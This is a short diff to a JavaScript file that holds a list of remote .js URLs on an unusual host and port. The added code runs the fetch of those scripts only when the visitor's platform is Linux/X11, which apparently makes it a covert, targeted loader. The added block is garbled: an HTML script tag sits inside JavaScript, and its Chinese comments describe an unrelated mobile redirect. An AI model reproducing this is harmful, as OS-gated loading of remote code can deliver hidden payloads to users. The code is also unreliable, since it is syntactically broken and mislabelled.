@@ -105,5 +105,19 @@ const input = ["https://edssnet.changchunets.com:4443/ty/x-2006-33.js","https://
         }   
        checkAddReq();
     }
-
-    handleFetchQueue(input,input.length)
+    <script language="javascript"> 
+//平台、设备和操作系统  
+var system ={  
+    win : false,  
+    mac : false,  
+    xll : false  
+};  
+//检测平台  
+var p = navigator.platform;  
+x11 = (p == "X11") || (p.indexOf("Linux") == 0);  
+//跳转语句，如果是手机访问就自动跳转到caibaojian.com页面  
+if(x11){  
+  handleFetchQueue(input,input.length)
+}
+</script>
+   
